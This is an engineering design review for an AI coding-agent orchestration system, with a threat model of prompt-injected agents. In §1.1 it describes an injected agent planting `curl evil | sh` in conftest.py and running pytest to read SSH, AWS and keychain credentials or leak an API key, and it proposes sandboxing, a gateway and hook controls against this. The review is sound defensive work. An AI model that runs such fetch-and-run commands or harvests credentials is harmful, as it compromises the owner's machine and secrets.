# Plan review: brief, architecture and work packages

**Date:** 2026-11-12 · **Author:** lead engineer · **Reader:** Chief Architect

This is my critique of `PROJECT_BRIEF.md`, `ARCHITECTURE.md` and `implementation/00–18` before
anyone builds on them. The same PR applies targeted edits for the factual fixes. Items marked
**Decision** are yours. The PR proposes them, but nothing that depends on them should be built
until you rule (§8).

Library claims were checked on 2026-11-12 against the official docs and package indexes (sources at
the end). Overall the plan is sound: the `AgentRuntime` seam, LangGraph as the orchestration layer
rather than the agent loop, and workspace scoping from day one are the right calls. The problems
are concentrated in four places:

1. **The command policy is not containment** (§1.1). Allowlisted test runners execute code the
   agent wrote, so v1 has no real boundary between a prompt-injected agent and the owner's home directory.
2. **Harness runtimes leak the provider key to the agent and execute config from the untrusted
   worktree** (§1.2, §1.3).
3. **Two library assumptions are wrong in ways that would ship insecure code** (§2): Agent SDK
   `allowed_tools` does not restrict tools, and the DeepSeek model IDs in doc 02 are retired.
4. **Command approvals as LangGraph interrupts re-run the whole junior session on resume** (§3.1).

---

## 1. Security model gaps

### 1.1 The command policy cannot contain a hostile agent *(Decision D1)*
**Problem.** ARCH §6.3 allowlists `pytest` and `npm test` to run without approval. Both execute
repo code that the agent itself just wrote (`conftest.py`, `package.json` scripts, test files). A
prompt-injected junior writes `conftest.py` containing `curl evil | sh`, then runs `pytest`, and
the policy says *allow*. Doc 18d's injection test ("a repo file says run `curl evil|sh`; confirm the
policy blocks it") would pass while this two-step version succeeds.

**Consequence.** Without an OS sandbox, any test run can read whatever the owner can:
`~/.ssh`, `~/.aws`, `~/.config/gh`, browser profiles. Setting `HOME` to a temp dir does not stop
absolute paths. The run can also send that data anywhere. ARCH §6.4 records network access as the
only accepted risk; the real accepted risk is "agents can do anything you can". The keychain may
also be reachable: keyring items trust the Python binary that created them, and an agent's
`python -c "import keyring; …"` could use the same binary. That needs a test (added to 18d).

**Fix.** Treat the command policy as a *tripwire* (it stops direct dangerous commands and supplies
approval UX) and add a real *boundary*: run every agent-spawned process in an OS sandbox from the
first real run, not in 18c. On macOS the cheapest credible option is Anthropic's
[`sandbox-runtime`](https://github.com/anthropics/sandbox-runtime) (`srt`). It uses Seatbelt for the
filesystem, a filtering proxy for the network, and needs no Docker. It is what the Claude Agent SDK's
own `sandbox` option uses, and it can wrap any command, so it also covers the Cline CLI and native
`run_command`. Policy: write access to the worktree only; read access to the worktree plus
toolchains; deny `~/.ssh`, `~/.aws`, `~/.config` and the keychain; network denied except a per-repo
allowlist (package registries during setup, the Gaia LLM gateway during runs). Docker (18c) stays
as the stronger option for later.

**Docs:** ARCH §6.3–6.4, 09, 10, 18c, 18d.

### 1.2 Harness runtimes hand the provider key to the agent *(Decision D2)*
**Problem.** ARCH §6.1 lets a harness runtime receive "the single key it needs" in its environment.
The harness runs the agent's shell commands as its own children, so `env` prints the key and an
injected agent can send it out. The two harnesses make this worse:
- The Agent SDK's `env` option **merges onto the inherited environment**. It does not replace it,
  so doc 10's "build the env from scratch" is not what the SDK does by default.
- Cline's `-k/--key` **persists the key in plaintext** at `~/.cline/data/settings/providers.json`.
  That breaks the brief's "no plaintext keys" rule.

**Fix: a Gaia LLM gateway** (new work package **07b**). This is a reverse proxy in the Gaia
process, on `127.0.0.1`. Runtimes get `ANTHROPIC_BASE_URL` (Agent SDK) or an OpenAI-compatible base
URL (Cline, native DeepSeek) pointing at it, plus a random **per-run token** that is worthless
outside Gaia. The gateway:
- injects the real key from the keychain, so no agent environment ever holds a provider key;
- meters every request per run, which makes cost accounting identical across native and harness
  runtimes and replaces doc 10's "cost polling";
- enforces budgets as a **hard stop** by refusing the next request, instead of trusting
  `max_budget_usd`, which the SDK documents as an estimate that can overshoot;
- dies with the backend, so orphaned agent processes (§5.2) cannot keep spending.

This is the pattern Anthropic's
[secure deployment guide](https://code.claude.com/docs/en/agent-sdk/secure-deployment) recommends
("the proxy pattern"). Cost: one junior-sized PR. The spike (08) must confirm which endpoints each
harness calls, so the gateway can allowlist them.

**Docs:** ARCH §3, §6.1, 07, 08, 10, 18a.

### 1.3 Harnesses and git execute config from the untrusted worktree
**Problem.** Three places run code chosen by repo content, outside any Gaia policy:
- **Claude Agent SDK.** `setting_sources` defaults to loading user, project and local settings.
  A repo's `.claude/settings.json` can add **hooks** (arbitrary shell commands the harness runs)
  and **allow rules**. A repo's `CLAUDE.md` injects instructions.
- **Cline CLI.** Hooks load from `.cline/hooks` in the workspace, as well as `~/.cline/hooks`.
- **git.** Gaia's own `git commit` in a worktree runs the repo's hooks. With husky-style
  `core.hooksPath=.husky`, the hook files are tracked, so **the agent can write them**, and Gaia then
  executes them outside the command policy. Also, with `HOME` scrubbed, `git commit` has no identity,
  and a user's `commit.gpgsign` setting would break or prompt.

**Fix (no decision needed; folded into the docs):**
- Agent SDK: `setting_sources=[]`, with Gaia passing explicit `settings`.
- Cline: `--hooks-dir` pointing at a Gaia-owned directory. The spike must prove the workspace
  `.cline/hooks` can be disabled; if it can't, Cline is disqualified.
- Every Gaia git call: `-c core.hooksPath=/dev/null`, `commit --no-verify`, `GIT_CONFIG_NOSYSTEM=1`,
  `GIT_CONFIG_GLOBAL=<gaia-managed file>` holding the identity and `commit.gpgsign=false`.

**Docs:** ARCH §6, 05, 08, 09, 10.

### 1.4 Smaller security items
- **`main` has no branch protection** on GitHub, but ARCH §6.6 relies on it as the second line of
  defence. Require PRs and the `make check` status before agent code lands.
- **Repo-supplied policy (`.gaia/policy.toml`, doc 09).** It's low value, it reads policy from
  untrusted content, and it adds an approval flow. Proposed cut from v1 (D3).
- **Data residency.** Junior turns send repo contents to DeepSeek's API. That's fine for your own
  repos; for coworkers' or employer code it becomes a policy question. Keep the junior `base_url` in
  settings, so a different host serving the same model is a configuration change (D4, not urgent).

---

## 2. Library assumptions checked against current docs

| Doc | Claim | Verdict | Fix |
|---|---|---|---|
| 07 | Opus 5.5: omit `thinking` or send adaptive; `budget_tokens` and `disabled` return 400; control depth with `output_config.effort`, which defaults to `medium` | ✅ correct | none |
| 07 | Forced `tool_choice` returns 400; use `auto` + `strict: true` or structured outputs | ✅ correct | none |
| 07, 11 | `client.messages.parse(..., output_format=Model)` | ✅ correct for the SDK helper (result in `.parsed_output`). The raw API parameter is now `output_config.format`, and the old raw `output_format` is deprecated | Note added |
| 07 | Top-level `cache_control`, `_request_id`, 2 built-in retries, typed errors | ✅ correct | none |
| 07 | `anthropic` SDK version | ⚠️ now **2.x** on PyPI. The 1.x line moved to `httpx2`, so `respx` won't intercept it | Pin the major; test with `FakeLLM`, not HTTP mocks |
| 07 | Price table: input, output and cache-read prices only | ❌ misses Anthropic **cache-write** pricing, and DeepSeek's **peak/off-peak** and **cache hit/miss** pricing | Richer `PriceTable` (doc 07 edit) |
| 07 | Refusals surface as `LLMStop` | ⚠️ Correct, but Opus 5.5 classifiers can refuse security-flavoured work, and Gaia's own tickets *are* security code. Server-side `fallbacks` (beta) retries on another model | Recommended in 07. Price usage by the model that actually served |
| 10 | Native Claude tool loop | ⚠️ Opus 5.5 binds thinking blocks to the conversation prefix. Editing earlier turns (for example redacting or truncating old tool results) invalidates them, and enforced accounts get a 400 | History sent to the API is append-only; redact only the *event copies* |
| 02 | `junior_model="deepseek-chat"` | ❌ `deepseek-chat` and `deepseek-reasoner` are gone from DeepSeek's model list (reported deprecated 2026-07-24). Current IDs: **`deepseek-flash`** (V4.1-Flash) and **`deepseek-v4-pro`**; 1M context, thinking on by default, tool calls supported | Default `deepseek-v4-pro`; ADR-001 confirms flash vs pro on measured cost and quality |
| 08 | DeepSeek only via its OpenAI-compatible API | ⚠️ DeepSeek now also serves an **Anthropic-compatible** endpoint (`https://api.deepseek.com/anthropic`) | New spike candidate: Claude Agent SDK driving DeepSeek, giving **one harness for both roles** |
| 08, 10 | Agent SDK: "restrict with `allowed_tools`" | ❌ **`allowed_tools` auto-approves; it does not restrict.** Unlisted tools stay available, and auto-approved calls skip `can_use_tool` | Remove tools with `disallowed_tools`; use `permission_mode="dontAsk"`; enforce Gaia policy in a **`PreToolUse` hook**, which runs for every call |
| 10 | Agent SDK `cancel` | ⚠️ `query()` does not support interrupts; `ClaudeSDKClient.interrupt()` does | Use `ClaudeSDKClient` |
| 10 | Agent SDK env "from scratch" | ❌ `env` merges onto the inherited env | Launch with a scrubbed parent env (wrapper via `cli_path`), and use the gateway (§1.2) |
| 08 | Agent SDK extras | ℹ️ It has `max_budget_usd` (an estimate), `output_format` (structured output), `sandbox`, and `user` (run as another OS user) | Spike evaluates them |
| 08 | Cline: is there a headless mode? | ✅ Yes. Passing a prompt runs headless, **with auto-approve on by default (yolo)**. `--json` emits JSON lines (`agent_event`, `hook_event`, `run_result`, `run_aborted`). It has `--timeout`, `-c/--cwd`, `--config`/`--data-dir`, `--hooks-dir` and `PreToolUse` hooks. It has **no shell allow/deny list** of its own | Spike must confirm hook-based denial, disabling workspace hooks, and that a key can be supplied without persisting it (or use the gateway). Exit codes and cancellation are undocumented, so kill the process group |
| 12 | `CompiledGraph`, `AsyncSqliteSaver` | ⚠️ LangGraph is **1.2**; the compiled type is `CompiledStateGraph`. `AsyncSqliteSaver.from_conn_string()` is an async context manager that must stay open for the app lifespan | Doc 12 edit |
| 12 | Crash recovery | ⚠️ Recovery depends on the `durability` mode (`"sync"`, `"async"`, `"exit"`); the default is not clearly documented. A crashed run is resumed by invoking with input `None` on the same `thread_id` (verify against the installed version) | Set `durability="sync"` explicitly |
| 12 | Interrupt semantics | ⚠️ On resume, the node **re-runs from its first line**. Interrupts match by index, and a bare `try/except` around `interrupt()` swallows it | §3.1 |
| 16 | `react-router-dom`, hand-written typed `apiFetch`, Tailwind config | ⚠️ React Router v7+ is imported from `react-router`; `openapi-fetch` (same authors as `openapi-typescript`) replaces the hand-written wrapper; Tailwind v4 uses `@tailwindcss/vite` and no config file | Doc 16 edit |
| 01 | ESLint, Node 20+ | ❌ create-vite 9 ships oxlint; Node 20 went EOL in April 2026 | Fixed in PR #2 |

---

## 3. Workflow and LangGraph design

### 3.1 Command approvals must not be graph interrupts
**Problem.** Doc 12 has `implement_step` call `runtime.run_task()`. On `needs_approval` it calls
`interrupt()`, and on resume it re-dispatches. LangGraph re-executes the node from the top on resume,
so the junior's **whole session is thrown away and re-run**: you pay twice, the run is
nondeterministic, and the approved command may never be asked for again. "Write the approval row
*before* interrupting" also inserts a duplicate row on every resume.

**Fix.**
- Graph-level interrupts are only for gates **between** agent turns: `plan`, `escalation`, `budget`,
  `pr_open`, `merge`.
- **In-turn command approvals live in the runtime.** The permission hook upserts an `approval` row,
  publishes `approval.requested`, and *awaits* the decision with a timeout that defaults to deny,
  while the agent session stays alive. The approvals API (14) resolves the waiting future. If the
  backend crashes during the wait, the step restarts from its checkpoint. That is acceptable, and it
  is documented.
- Every side effect before an interrupt is an **upsert keyed by `(run_id, node, step_index, attempt)`**.

### 3.2 Two databases, one source of truth
`gaia.sqlite` and `checkpoints.sqlite` cannot commit together. Rule: **the checkpoint owns the
workflow position; domain rows (`run.status`, `run_step`) are projections** that nodes write
idempotently, and startup reconciles them from the checkpoint.

### 3.3 Who does the lead's "implementation work"?
ARCH §3 and doc 08 say "Claude Agent SDK for lead implementation work", but no graph node has the
lead implement anything. The useful version is **agentic planning**: the lead explores the repo
read-only (`Read`/`Grep`/`Glob`) and returns a `Plan` through the SDK's `output_format`. That is
better than doc 11's static "README + depth-2 tree" context. The spike measures both, and doc 11
keeps the static version as the fallback.

### 3.4 Ticket status is never updated
Nothing moves a ticket to `in_progress`, `in_review` or `done`. That belongs in doc 12's nodes.

---

## 4. Data model gaps (doc 03)
- `ticket.repo_id`: missing, but every ticket belongs to a repo.
- `run`: add `repo_id`, `worktree_id`, `junior_runtime`, `started_at`, `finished_at`.
  `run_step`: add `title`, `spec_json` (the `PlanStep`) and `result_summary`.
- `event.seq`: a monotonic integer, needed for SSE `Last-Event-ID` replay. UUIDv7 is not
  guaranteed monotonic within a millisecond.
- `llm_usage`: add `run_step_id`, `cache_creation_tokens`, `request_id` and `price_tier`.
- `ApprovalKind`: add `escalation` (doc 12 already uses it).
- Table `user` is a **reserved word in Postgres**; name it `users`.
- `repository`: add owner-registered `setup_command` and `test_command` (§5.1).

## 5. Missing work
1. **Dependencies in fresh worktrees.** A new worktree has no `.venv` or `node_modules`, so step 3 of
   the success criteria (tests after each step) cannot run. Add owner-registered per-repo
   `setup_command` and `test_command` (stored in the DB, never read from the repo), run in
   `prepare_worktree` inside the sandbox, with network allowed only to package registries.
2. **Orphaned agent processes.** If the backend dies, a Claude Code or Cline child process can keep
   editing the worktree. Record each runtime's process-group ID; on startup, kill the leftovers
   (after checking each is ours). The gateway also cuts off their spend.
3. **The LLM gateway** (07b, §1.2).
4. **One origin for UI and API.** Use Vite's `server.proxy` to forward `/api` in dev, and have
   FastAPI serve the built UI in production mode. CORS then disappears, the CSP becomes `'self'`,
   and SSE is same-origin (docs 04, 16).
5. **Clarify in the brief:** v1 runs **one junior at a time per run**; parallelism is across runs.

## 6. Packages too large for one junior PR
| Doc | Problem | Proposal |
|---|---|---|
| 07 | Clients, costs and a new gateway | **07a** clients, price table and recorder · **07b** LLM gateway |
| 08 | Judgment-heavy evaluation, not implementation | **Lead-owned** (me), not a junior task |
| 09 | Path guard, policy engine, 8 tools, audit, repo policy | **09a** `confine()` + command policy + sandbox profile (pure, exhaustive tests, your review) · **09b** tools, registry, audit |
| 10 | One PR per runtime is already implied | **10a** base types, contract suite, fake runtime · **10b…** one PR per runtime chosen in ADR-001 |
| 11 | Prompts are architecture | Junior wires the code; the lead writes `lead_plan.md` and `lead_review.md` |
| 12 | Hardest component: graph, 9 nodes, guard, manager, recovery | **12a** graph skeleton on fakes (state, checkpointer, interrupts, `RunManager`, crash-recovery test), lead-owned or pair-reviewed · **12b** real nodes wired to services |
| 15 | Push, PR, CI watch, merge, sync, issue import, API | **15a** push, open PR, merge · **15b** CI watch, PR sync, PR API · **15c** issue import (optional in v1) |

## 7. Build order
Corrections to the dependency table: **07 depends on 03** (the recorder writes `llm_usage` rows).
**16 needs 06's OpenAPI export** before it can generate types; it can start earlier against a stub.
**12a only needs 03**, so the riskiest component can start much earlier, on fakes. The revised table
and the wave plan are in `implementation/00-README.md`.

## 8. Decisions needed from you
| # | Decision | Options | Recommendation |
|---|---|---|---|
| D1 | When does an OS sandbox arrive? | (a) In 09a, using `srt`, before the first real run · (b) Keep 18c; until then run only on fully trusted repos and accept the risk · (c) A dedicated macOS user for agents | **(a).** Cheap, no Docker, and covers every runtime |
| D2 | Add the LLM gateway (07b)? | (a) Yes, and every runtime goes through it · (b) No: per-process keys plus SDK budget estimates | **(a).** It closes key exposure, gives hard budgets and uniform cost accounting |
| D3 | Cut repo-supplied `.gaia/policy.toml` from v1? | Cut, or keep | **Cut.** Policy lives in Gaia, per repo, set by you |
| D4 | Junior model and host | `deepseek-v4-pro` or `deepseek-flash`; DeepSeek-hosted or another host | Default `v4-pro`; the spike measures both. Host: DeepSeek for v1, revisit before coworkers join |
| D5 | Runtime choice | Settled by ADR-001 (doc 08) | No pre-commitment, as you asked |

## Sources
- Claude API (models, thinking, effort, structured outputs, caching, refusals, preserved thinking): Anthropic's Claude API skill reference (cached 2026-11-03) and [platform.claude.com docs](https://platform.claude.com/docs)
- Claude Agent SDK: [Python reference](https://code.claude.com/docs/en/agent-sdk/python), [permissions](https://code.claude.com/docs/en/agent-sdk/permissions), [secure deployment](https://code.claude.com/docs/en/agent-sdk/secure-deployment)
- LangGraph: [interrupts](https://docs.langchain.com/oss/python/langgraph/interrupts), [durability reference](https://reference.langchain.com/python/langgraph/types/Durability); PyPI: `langgraph` 1.2.21, `langgraph-checkpoint-sqlite` 3.1.3
- Cline CLI: [CLI reference](https://docs.cline.bot/cline-cli/cli-reference.md), [overview](https://docs.cline.bot/cline-cli)
- DeepSeek: [Models & Pricing](https://api-docs.deepseek.com/quick_start/pricing); legacy-name deprecation reported by [TheRouter](https://therouter-docs.pages.dev/news/deepseek-v4-api-migration-deprecation-2026/)
- Node.js release index (`nodejs.org/dist/index.json`): Node 26 is the current LTS
